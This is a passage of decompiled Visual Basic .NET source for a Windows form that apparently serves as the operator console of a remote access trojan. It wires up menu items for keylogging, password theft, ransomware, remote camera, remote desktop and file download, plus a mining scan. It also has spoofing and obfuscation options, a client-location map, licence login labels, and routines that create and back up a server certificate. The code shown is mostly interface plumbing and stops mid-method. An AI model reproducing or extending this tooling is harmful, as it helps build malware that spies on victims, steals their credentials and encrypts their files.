		' (set) Token: 0x06000CBE RID: 3262 RVA: 0x000704A7 File Offset: 0x0006E6A7
		Friend Overridable Property Column13 As DataGridViewTextBoxColumn

		' Token: 0x1700056C RID: 1388
		' (get) Token: 0x06000CBF RID: 3263 RVA: 0x000704B0 File Offset: 0x0006E6B0
		' (set) Token: 0x06000CC0 RID: 3264 RVA: 0x000704BA File Offset: 0x0006E6BA
		Friend Overridable Property Column14 As DataGridViewImageColumn

		' Token: 0x1700056D RID: 1389
		' (get) Token: 0x06000CC1 RID: 3265 RVA: 0x000704C3 File Offset: 0x0006E6C3
		' (set) Token: 0x06000CC2 RID: 3266 RVA: 0x000704CD File Offset: 0x0006E6CD
		Friend Overridable Property Column15 As DataGridViewTextBoxColumn

		' Token: 0x1700056E RID: 1390
		' (get) Token: 0x06000CC3 RID: 3267 RVA: 0x000704D6 File Offset: 0x0006E6D6
		' (set) Token: 0x06000CC4 RID: 3268 RVA: 0x000704E0 File Offset: 0x0006E6E0
		Friend Overridable Property Column16 As DataGridViewImageColumn

		' Token: 0x1700056F RID: 1391
		' (get) Token: 0x06000CC5 RID: 3269 RVA: 0x000704E9 File Offset: 0x0006E6E9
		' (set) Token: 0x06000CC6 RID: 3270 RVA: 0x000704F3 File Offset: 0x0006E6F3
		Friend Overridable Property Column17 As DataGridViewTextBoxColumn

		' Token: 0x17000570 RID: 1392
		' (get) Token: 0x06000CC7 RID: 3271 RVA: 0x000704FC File Offset: 0x0006E6FC
		' (set) Token: 0x06000CC8 RID: 3272 RVA: 0x00070506 File Offset: 0x0006E706
		Friend Overridable Property Column18 As DataGridViewImageColumn

		' Token: 0x17000571 RID: 1393
		' (get) Token: 0x06000CC9 RID: 3273 RVA: 0x0007050F File Offset: 0x0006E70F
		' (set) Token: 0x06000CCA RID: 3274 RVA: 0x00070519 File Offset: 0x0006E719
		Friend Overridable Property Column19 As DataGridViewTextBoxColumn

		' Token: 0x17000572 RID: 1394
		' (get) Token: 0x06000CCB RID: 3275 RVA: 0x00070522 File Offset: 0x0006E722
		' (set) Token: 0x06000CCC RID: 3276 RVA: 0x0007052C File Offset: 0x0006E72C
		Friend Overridable Property Column20 As DataGridViewImageColumn

		' Token: 0x17000573 RID: 1395
		' (get) Token: 0x06000CCD RID: 3277 RVA: 0x00070535 File Offset: 0x0006E735
		' (set) Token: 0x06000CCE RID: 3278 RVA: 0x0007053F File Offset: 0x0006E73F
		Friend Overridable Property Column32 As DataGridViewTextBoxColumn

		' Token: 0x17000574 RID: 1396
		' (get) Token: 0x06000CCF RID: 3279 RVA: 0x00070548 File Offset: 0x0006E748
		' (set) Token: 0x06000CD0 RID: 3280 RVA: 0x00070554 File Offset: 0x0006E754
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				toolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000575 RID: 1397
		' (get) Token: 0x06000CD1 RID: 3281 RVA: 0x00070597 File Offset: 0x0006E797
		' (set) Token: 0x06000CD2 RID: 3282 RVA: 0x000705A4 File Offset: 0x0006E7A4
		Friend Overridable Property ToolStripMenuItem2 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem2_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem2
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem2 = value
				toolStripMenuItem = Me._ToolStripMenuItem2
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000576 RID: 1398
		' (get) Token: 0x06000CD3 RID: 3283 RVA: 0x000705E7 File Offset: 0x0006E7E7
		' (set) Token: 0x06000CD4 RID: 3284 RVA: 0x000705F4 File Offset: 0x0006E7F4
		Friend Overridable Property ToolStripMenuItem3 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem3_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem3
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem3 = value
				toolStripMenuItem = Me._ToolStripMenuItem3
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000577 RID: 1399
		' (get) Token: 0x06000CD5 RID: 3285 RVA: 0x00070637 File Offset: 0x0006E837
		' (set) Token: 0x06000CD6 RID: 3286 RVA: 0x00070641 File Offset: 0x0006E841
		Friend Overridable Property HelpFolderClient As Guna2ContextMenuStrip

		' Token: 0x17000578 RID: 1400
		' (get) Token: 0x06000CD7 RID: 3287 RVA: 0x0007064A File Offset: 0x0006E84A
		' (set) Token: 0x06000CD8 RID: 3288 RVA: 0x00070654 File Offset: 0x0006E854
		Friend Overridable Property FolderDownload As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FolderDownload
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FolderDownload_Click
				Dim folderDownload As ToolStripMenuItem = Me._FolderDownload
				If folderDownload IsNot Nothing Then
					RemoveHandler folderDownload.Click, value2
				End If
				Me._FolderDownload = value
				folderDownload = Me._FolderDownload
				If folderDownload IsNot Nothing Then
					AddHandler folderDownload.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000579 RID: 1401
		' (get) Token: 0x06000CD9 RID: 3289 RVA: 0x00070697 File Offset: 0x0006E897
		' (set) Token: 0x06000CDA RID: 3290 RVA: 0x000706A4 File Offset: 0x0006E8A4
		Friend Overridable Property FolderKeylogger As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FolderKeylogger
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FolderKeylogger_Click
				Dim folderKeylogger As ToolStripMenuItem = Me._FolderKeylogger
				If folderKeylogger IsNot Nothing Then
					RemoveHandler folderKeylogger.Click, value2
				End If
				Me._FolderKeylogger = value
				folderKeylogger = Me._FolderKeylogger
				If folderKeylogger IsNot Nothing Then
					AddHandler folderKeylogger.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700057A RID: 1402
		' (get) Token: 0x06000CDB RID: 3291 RVA: 0x000706E7 File Offset: 0x0006E8E7
		' (set) Token: 0x06000CDC RID: 3292 RVA: 0x000706F4 File Offset: 0x0006E8F4
		Friend Overridable Property FolderPassword As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FolderPassword
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FolderPassword_Click
				Dim folderPassword As ToolStripMenuItem = Me._FolderPassword
				If folderPassword IsNot Nothing Then
					RemoveHandler folderPassword.Click, value2
				End If
				Me._FolderPassword = value
				folderPassword = Me._FolderPassword
				If folderPassword IsNot Nothing Then
					AddHandler folderPassword.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700057B RID: 1403
		' (get) Token: 0x06000CDD RID: 3293 RVA: 0x00070737 File Offset: 0x0006E937
		' (set) Token: 0x06000CDE RID: 3294 RVA: 0x00070744 File Offset: 0x0006E944
		Friend Overridable Property FolderRansomware As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FolderRansomware
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FolderRansomware_Click
				Dim folderRansomware As ToolStripMenuItem = Me._FolderRansomware
				If folderRansomware IsNot Nothing Then
					RemoveHandler folderRansomware.Click, value2
				End If
				Me._FolderRansomware = value
				folderRansomware = Me._FolderRansomware
				If folderRansomware IsNot Nothing Then
					AddHandler folderRansomware.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700057C RID: 1404
		' (get) Token: 0x06000CDF RID: 3295 RVA: 0x00070787 File Offset: 0x0006E987
		' (set) Token: 0x06000CE0 RID: 3296 RVA: 0x00070794 File Offset: 0x0006E994
		Friend Overridable Property RemoteCamera As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RemoteCamera
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RemoteCamera_Click
				Dim remoteCamera As ToolStripMenuItem = Me._RemoteCamera
				If remoteCamera IsNot Nothing Then
					RemoveHandler remoteCamera.Click, value2
				End If
				Me._RemoteCamera = value
				remoteCamera = Me._RemoteCamera
				If remoteCamera IsNot Nothing Then
					AddHandler remoteCamera.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700057D RID: 1405
		' (get) Token: 0x06000CE1 RID: 3297 RVA: 0x000707D7 File Offset: 0x0006E9D7
		' (set) Token: 0x06000CE2 RID: 3298 RVA: 0x000707E4 File Offset: 0x0006E9E4
		Friend Overridable Property FolderDesktop As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._FolderDesktop
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.FolderDesktop_Click
				Dim folderDesktop As ToolStripMenuItem = Me._FolderDesktop
				If folderDesktop IsNot Nothing Then
					RemoveHandler folderDesktop.Click, value2
				End If
				Me._FolderDesktop = value
				folderDesktop = Me._FolderDesktop
				If folderDesktop IsNot Nothing Then
					AddHandler folderDesktop.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700057E RID: 1406
		' (get) Token: 0x06000CE3 RID: 3299 RVA: 0x00070827 File Offset: 0x0006EA27
		' (set) Token: 0x06000CE4 RID: 3300 RVA: 0x00070831 File Offset: 0x0006EA31
		Friend Overridable Property Guna2Elipse31 As Guna2Elipse

		' Token: 0x1700057F RID: 1407
		' (get) Token: 0x06000CE5 RID: 3301 RVA: 0x0007083A File Offset: 0x0006EA3A
		' (set) Token: 0x06000CE6 RID: 3302 RVA: 0x00070844 File Offset: 0x0006EA44
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000580 RID: 1408
		' (get) Token: 0x06000CE7 RID: 3303 RVA: 0x0007084D File Offset: 0x0006EA4D
		' (set) Token: 0x06000CE8 RID: 3304 RVA: 0x00070857 File Offset: 0x0006EA57
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x17000581 RID: 1409
		' (get) Token: 0x06000CE9 RID: 3305 RVA: 0x00070860 File Offset: 0x0006EA60
		' (set) Token: 0x06000CEA RID: 3306 RVA: 0x0007086A File Offset: 0x0006EA6A
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x17000582 RID: 1410
		' (get) Token: 0x06000CEB RID: 3307 RVA: 0x00070873 File Offset: 0x0006EA73
		' (set) Token: 0x06000CEC RID: 3308 RVA: 0x00070880 File Offset: 0x0006EA80
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000583 RID: 1411
		' (get) Token: 0x06000CED RID: 3309 RVA: 0x000708C3 File Offset: 0x0006EAC3
		' (set) Token: 0x06000CEE RID: 3310 RVA: 0x000708D0 File Offset: 0x0006EAD0
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000584 RID: 1412
		' (get) Token: 0x06000CEF RID: 3311 RVA: 0x00070913 File Offset: 0x0006EB13
		' (set) Token: 0x06000CF0 RID: 3312 RVA: 0x00070920 File Offset: 0x0006EB20
		Friend Overridable Property Timer2MAP As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2MAP
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer2MAP_Tick
				Dim timer2MAP As System.Windows.Forms.Timer = Me._Timer2MAP
				If timer2MAP IsNot Nothing Then
					RemoveHandler timer2MAP.Tick, value2
				End If
				Me._Timer2MAP = value
				timer2MAP = Me._Timer2MAP
				If timer2MAP IsNot Nothing Then
					AddHandler timer2MAP.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000585 RID: 1413
		' (get) Token: 0x06000CF1 RID: 3313 RVA: 0x00070963 File Offset: 0x0006EB63
		' (set) Token: 0x06000CF2 RID: 3314 RVA: 0x0007096D File Offset: 0x0006EB6D
		Friend Overridable Property ScanMining As Guna2ContextMenuStrip

		' Token: 0x17000586 RID: 1414
		' (get) Token: 0x06000CF3 RID: 3315 RVA: 0x00070976 File Offset: 0x0006EB76
		' (set) Token: 0x06000CF4 RID: 3316 RVA: 0x00070980 File Offset: 0x0006EB80
		Friend Overridable Property ToolStripMenuItem4 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem4
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem4_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem4
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem4 = value
				toolStripMenuItem = Me._ToolStripMenuItem4
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000587 RID: 1415
		' (get) Token: 0x06000CF5 RID: 3317 RVA: 0x000709C3 File Offset: 0x0006EBC3
		' (set) Token: 0x06000CF6 RID: 3318 RVA: 0x000709CD File Offset: 0x0006EBCD
		Friend Overridable Property Column2 As DataGridViewImageColumn

		' Token: 0x17000588 RID: 1416
		' (get) Token: 0x06000CF7 RID: 3319 RVA: 0x000709D6 File Offset: 0x0006EBD6
		' (set) Token: 0x06000CF8 RID: 3320 RVA: 0x000709E0 File Offset: 0x0006EBE0
		Friend Overridable Property Column24 As DataGridViewTextBoxColumn

		' Token: 0x17000589 RID: 1417
		' (get) Token: 0x06000CF9 RID: 3321 RVA: 0x000709E9 File Offset: 0x0006EBE9
		' (set) Token: 0x06000CFA RID: 3322 RVA: 0x000709F3 File Offset: 0x0006EBF3
		Friend Overridable Property Column26 As DataGridViewTextBoxColumn

		' Token: 0x1700058A RID: 1418
		' (get) Token: 0x06000CFB RID: 3323 RVA: 0x000709FC File Offset: 0x0006EBFC
		' (set) Token: 0x06000CFC RID: 3324 RVA: 0x00070A06 File Offset: 0x0006EC06
		Friend Overridable Property Column27 As DataGridViewTextBoxColumn

		' Token: 0x1700058B RID: 1419
		' (get) Token: 0x06000CFD RID: 3325 RVA: 0x00070A0F File Offset: 0x0006EC0F
		' (set) Token: 0x06000CFE RID: 3326 RVA: 0x00070A19 File Offset: 0x0006EC19
		Friend Overridable Property Column29 As DataGridViewTextBoxColumn

		' Token: 0x1700058C RID: 1420
		' (get) Token: 0x06000CFF RID: 3327 RVA: 0x00070A22 File Offset: 0x0006EC22
		' (set) Token: 0x06000D00 RID: 3328 RVA: 0x00070A2C File Offset: 0x0006EC2C
		Friend Overridable Property Column30 As DataGridViewTextBoxColumn

		' Token: 0x1700058D RID: 1421
		' (get) Token: 0x06000D01 RID: 3329 RVA: 0x00070A35 File Offset: 0x0006EC35
		' (set) Token: 0x06000D02 RID: 3330 RVA: 0x00070A3F File Offset: 0x0006EC3F
		Friend Overridable Property Column31 As DataGridViewTextBoxColumn

		' Token: 0x1700058E RID: 1422
		' (get) Token: 0x06000D03 RID: 3331 RVA: 0x00070A48 File Offset: 0x0006EC48
		' (set) Token: 0x06000D04 RID: 3332 RVA: 0x00070A52 File Offset: 0x0006EC52
		Friend Overridable Property Column33 As DataGridViewTextBoxColumn

		' Token: 0x1700058F RID: 1423
		' (get) Token: 0x06000D05 RID: 3333 RVA: 0x00070A5B File Offset: 0x0006EC5B
		' (set) Token: 0x06000D06 RID: 3334 RVA: 0x00070A65 File Offset: 0x0006EC65
		Friend Overridable Property Column34 As DataGridViewTextBoxColumn

		' Token: 0x17000590 RID: 1424
		' (get) Token: 0x06000D07 RID: 3335 RVA: 0x00070A6E File Offset: 0x0006EC6E
		' (set) Token: 0x06000D08 RID: 3336 RVA: 0x00070A78 File Offset: 0x0006EC78
		Friend Overridable Property DataGridViewImageColumn2 As DataGridViewImageColumn

		' Token: 0x17000591 RID: 1425
		' (get) Token: 0x06000D09 RID: 3337 RVA: 0x00070A81 File Offset: 0x0006EC81
		' (set) Token: 0x06000D0A RID: 3338 RVA: 0x00070A8B File Offset: 0x0006EC8B
		Friend Overridable Property DataGridViewTextBoxColumn4 As DataGridViewTextBoxColumn

		' Token: 0x17000592 RID: 1426
		' (get) Token: 0x06000D0B RID: 3339 RVA: 0x00070A94 File Offset: 0x0006EC94
		' (set) Token: 0x06000D0C RID: 3340 RVA: 0x00070A9E File Offset: 0x0006EC9E
		Friend Overridable Property DataGridViewTextBoxColumn5 As DataGridViewTextBoxColumn

		' Token: 0x17000593 RID: 1427
		' (get) Token: 0x06000D0D RID: 3341 RVA: 0x00070AA7 File Offset: 0x0006ECA7
		' (set) Token: 0x06000D0E RID: 3342 RVA: 0x00070AB1 File Offset: 0x0006ECB1
		Friend Overridable Property DataGridViewTextBoxColumn10 As DataGridViewTextBoxColumn

		' Token: 0x17000594 RID: 1428
		' (get) Token: 0x06000D0F RID: 3343 RVA: 0x00070ABA File Offset: 0x0006ECBA
		' (set) Token: 0x06000D10 RID: 3344 RVA: 0x00070AC4 File Offset: 0x0006ECC4
		Friend Overridable Property DataGridViewTextBoxColumn11 As DataGridViewTextBoxColumn

		' Token: 0x17000595 RID: 1429
		' (get) Token: 0x06000D11 RID: 3345 RVA: 0x00070ACD File Offset: 0x0006ECCD
		' (set) Token: 0x06000D12 RID: 3346 RVA: 0x00070AD7 File Offset: 0x0006ECD7
		Friend Overridable Property Guna2GroupBox1 As Guna2GroupBox

		' Token: 0x17000596 RID: 1430
		' (get) Token: 0x06000D13 RID: 3347 RVA: 0x00070AE0 File Offset: 0x0006ECE0
		' (set) Token: 0x06000D14 RID: 3348 RVA: 0x00070AEA File Offset: 0x0006ECEA
		Friend Overridable Property ExpiryLogin As Guna2HtmlLabel

		' Token: 0x17000597 RID: 1431
		' (get) Token: 0x06000D15 RID: 3349 RVA: 0x00070AF3 File Offset: 0x0006ECF3
		' (set) Token: 0x06000D16 RID: 3350 RVA: 0x00070AFD File Offset: 0x0006ECFD
		Friend Overridable Property UsernameLogin As Guna2HtmlLabel

		' Token: 0x17000598 RID: 1432
		' (get) Token: 0x06000D17 RID: 3351 RVA: 0x00070B06 File Offset: 0x0006ED06
		' (set) Token: 0x06000D18 RID: 3352 RVA: 0x00070B10 File Offset: 0x0006ED10
		Friend Overridable Property UserIdLogin As Guna2HtmlLabel

		' Token: 0x17000599 RID: 1433
		' (get) Token: 0x06000D19 RID: 3353 RVA: 0x00070B19 File Offset: 0x0006ED19
		' (set) Token: 0x06000D1A RID: 3354 RVA: 0x00070B23 File Offset: 0x0006ED23
		Private Overridable Property Level As Guna2RatingStar

		' Token: 0x1700059A RID: 1434
		' (get) Token: 0x06000D1B RID: 3355 RVA: 0x00070B2C File Offset: 0x0006ED2C
		' (set) Token: 0x06000D1C RID: 3356 RVA: 0x00070B36 File Offset: 0x0006ED36
		Friend Overridable Property Guna2HtmlLabel6 As Guna2HtmlLabel

		' Token: 0x1700059B RID: 1435
		' (get) Token: 0x06000D1D RID: 3357 RVA: 0x00070B3F File Offset: 0x0006ED3F
		' (set) Token: 0x06000D1E RID: 3358 RVA: 0x00070B49 File Offset: 0x0006ED49
		Friend Overridable Property Guna2HtmlLabel3 As Guna2HtmlLabel

		' Token: 0x1700059C RID: 1436
		' (get) Token: 0x06000D1F RID: 3359 RVA: 0x00070B52 File Offset: 0x0006ED52
		' (set) Token: 0x06000D20 RID: 3360 RVA: 0x00070B5C File Offset: 0x0006ED5C
		Friend Overridable Property Label26 As Label

		' Token: 0x1700059D RID: 1437
		' (get) Token: 0x06000D21 RID: 3361 RVA: 0x00070B65 File Offset: 0x0006ED65
		' (set) Token: 0x06000D22 RID: 3362 RVA: 0x00070B6F File Offset: 0x0006ED6F
		Friend Overridable Property Guna2HtmlLabel1 As Guna2HtmlLabel

		' Token: 0x1700059E RID: 1438
		' (get) Token: 0x06000D23 RID: 3363 RVA: 0x00070B78 File Offset: 0x0006ED78
		' (set) Token: 0x06000D24 RID: 3364 RVA: 0x00070B82 File Offset: 0x0006ED82
		Friend Overridable Property PictureBox5 As System.Windows.Forms.PictureBox

		' Token: 0x1700059F RID: 1439
		' (get) Token: 0x06000D25 RID: 3365 RVA: 0x00070B8B File Offset: 0x0006ED8B
		' (set) Token: 0x06000D26 RID: 3366 RVA: 0x00070B95 File Offset: 0x0006ED95
		Friend Overridable Property Guna2GroupBox2 As Guna2GroupBox

		' Token: 0x170005A0 RID: 1440
		' (get) Token: 0x06000D27 RID: 3367 RVA: 0x00070B9E File Offset: 0x0006ED9E
		' (set) Token: 0x06000D28 RID: 3368 RVA: 0x00070BA8 File Offset: 0x0006EDA8
		Friend Overridable Property Label59 As Label

		' Token: 0x170005A1 RID: 1441
		' (get) Token: 0x06000D29 RID: 3369 RVA: 0x00070BB1 File Offset: 0x0006EDB1
		' (set) Token: 0x06000D2A RID: 3370 RVA: 0x00070BBB File Offset: 0x0006EDBB
		Friend Overridable Property Guna2ToggleSwitch3 As Guna2ToggleSwitch

		' Token: 0x170005A2 RID: 1442
		' (get) Token: 0x06000D2B RID: 3371 RVA: 0x00070BC4 File Offset: 0x0006EDC4
		' (set) Token: 0x06000D2C RID: 3372 RVA: 0x00070BCE File Offset: 0x0006EDCE
		Friend Overridable Property Label58 As Label

		' Token: 0x170005A3 RID: 1443
		' (get) Token: 0x06000D2D RID: 3373 RVA: 0x00070BD7 File Offset: 0x0006EDD7
		' (set) Token: 0x06000D2E RID: 3374 RVA: 0x00070BE1 File Offset: 0x0006EDE1
		Friend Overridable Property Guna2ToggleSwitch2 As Guna2ToggleSwitch

		' Token: 0x170005A4 RID: 1444
		' (get) Token: 0x06000D2F RID: 3375 RVA: 0x00070BEA File Offset: 0x0006EDEA
		' (set) Token: 0x06000D30 RID: 3376 RVA: 0x00070BF4 File Offset: 0x0006EDF4
		Friend Overridable Property Label55 As Label

		' Token: 0x170005A5 RID: 1445
		' (get) Token: 0x06000D31 RID: 3377 RVA: 0x00070BFD File Offset: 0x0006EDFD
		' (set) Token: 0x06000D32 RID: 3378 RVA: 0x00070C07 File Offset: 0x0006EE07
		Friend Overridable Property Guna2ToggleSwitch1 As Guna2ToggleSwitch

		' Token: 0x170005A6 RID: 1446
		' (get) Token: 0x06000D33 RID: 3379 RVA: 0x00070C10 File Offset: 0x0006EE10
		' (set) Token: 0x06000D34 RID: 3380 RVA: 0x00070C1A File Offset: 0x0006EE1A
		Friend Overridable Property Label51 As Label

		' Token: 0x170005A7 RID: 1447
		' (get) Token: 0x06000D35 RID: 3381 RVA: 0x00070C23 File Offset: 0x0006EE23
		' (set) Token: 0x06000D36 RID: 3382 RVA: 0x00070C2D File Offset: 0x0006EE2D
		Friend Overridable Property PictureBox7 As System.Windows.Forms.PictureBox

		' Token: 0x06000D37 RID: 3383 RVA: 0x00070C38 File Offset: 0x0006EE38
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormS500_Load
			AddHandler MyBase.Resize, AddressOf Me.FormS500_Resize
			Me.IPInformtion = New GetIPInfo()
			Me.ListCountry = New List(Of String)()
			Me.NumChckMap = 0
			Me.ChckRowIndex = 0
			Me.ResizeBool = False
			Me.Getsetting = True
			Me.numActive = 0
			Me.InitializeComponent()
			Me.SpoofingText.SelectedIndex = 0
			Me.ObfusctionComboBox.SelectedIndex = 0
			Setting.Running = True
		End Sub

		' Token: 0x06000D38 RID: 3384 RVA: 0x00070CD4 File Offset: 0x0006EED4
		Public Sub CheckCertificate()
			Try
				Dim flag As Boolean = File.Exists(Setting.Certificate_Path)
				If flag Then
					Setting.ServerCertificate = New X509Certificate2(Setting.Certificate_Path)
					Me.UiTabControl1.SelectedIndex = 7
					Me.PathPage.Text = "Port Settings"
					Me.NamePage1.Text = "Port Settings"
				Else
					Try
						Dim text As String = Application.StartupPath + "\Certificate\BackupCertificate.zip"
						Dim flag2 As Boolean = File.Exists(text)
						If flag2 Then
							Console.WriteLine("Found a zip backup")
							ZipFile.ExtractToDirectory(text, Application.StartupPath + "\Certificate")
							Setting.ServerCertificate = New X509Certificate2(Setting.Certificate_Path)
							Console.WriteLine("Complete")
							Try
								Me.SavePorts.Checked = Conversions.ToBoolean(Functions.RegistryGetValue("#SavePorts", Conversions.ToString(Me.SavePorts.Checked)))
							Catch ex As Exception
							End Try
							Me.UiTabControl1.SelectedIndex = 7
							Me.PathPage.Text = "Port Settings"
							Me.NamePage1.Text = "Port Settings"
						Else
							Me.PanelCertificate.Visible = True
							Me.PanelCertificate.Size = New Size(220, 603)
							Me.UiTabControl1.SelectedIndex = 8
							Me.PathPage.Text = "Certificate Settings"
							Me.NamePage1.Text = "Certificate Settings"
						End If
					Catch ex2 As Exception
						ListLogs.AddArray("Certificate : " + ex2.Message, 0)
						MessageBox.Show(Me, ex2.Message, "Certificate1", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						Environment.[Exit](0)
					End Try
				End If
			Catch ex3 As Exception
				MessageBox.Show(Me, ex3.Message, "Certificate2", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
				Environment.[Exit](0)
			End Try
		End Sub

		' Token: 0x06000D39 RID: 3385 RVA: 0x00070F20 File Offset: 0x0006F120
		Private Async Sub CreateCertificate_Click(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Operators.CompareString(Me.NameCertificate.Text, Nothing, False) = 0
				If flag Then
					MessageBox.Show("Please enter the certificate name", "Certificate!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1)
				Else
					Dim flag2 As Boolean = String.IsNullOrWhiteSpace(Me.NameCertificate.Text)
					If Not flag2 Then
						Me.ButtCreateCertificate.Text = "Please wait.."
						ListLogs.AddArray("Certificate : Please wait until the certificate is generated for the first time only ...", 2)
						Me.ButtCreateCertificate.Enabled = False
						Me.NameCertificate.Enabled = False
						Dim ex As Exception
						Await Task.Run(Sub()
							Try
								Dim flag3 As Boolean = Not Directory.Exists(Path.Combine(Application.StartupPath, "Certificate"))
								If flag3 Then
									Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Certificate"))
								End If
								Dim archiveFileName As String = Application.StartupPath + "\Certificate\BackupCertificate.zip"
								Setting.ServerCertificate = CreateCertificate.CreateCertificateAuthority(Me.NameCertificate.Text, 4096)
								File.WriteAllBytes(Setting.Certificate_Path, Setting.ServerCertificate.Export(X509ContentType.Pfx))
								Using zipArchive As ZipArchive = ZipFile.Open(archiveFileName, ZipArchiveMode.Create)
									zipArchive.CreateEntryFromFile(Setting.Certificate_Path, Path.GetFileName(Setting.Certificate_Path))
								End Using
								DataB.form1_0.L1.BeginInvoke(New MethodInvoker(Sub()
									MessageBox.Show(Me, "Certificate created successfully", "Certificate", MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
									Me.PanelCertificate.Visible = False
									Me.UiTabControl1.SelectedIndex = 7
									ListLogs.AddArray("Certificate : has been create successfully", 3)
								End Sub))
							Catch ex2 As Exception
								Dim $VB$Local_ex As Exception = ex2
								Dim ex As Exception = $VB$Local_ex
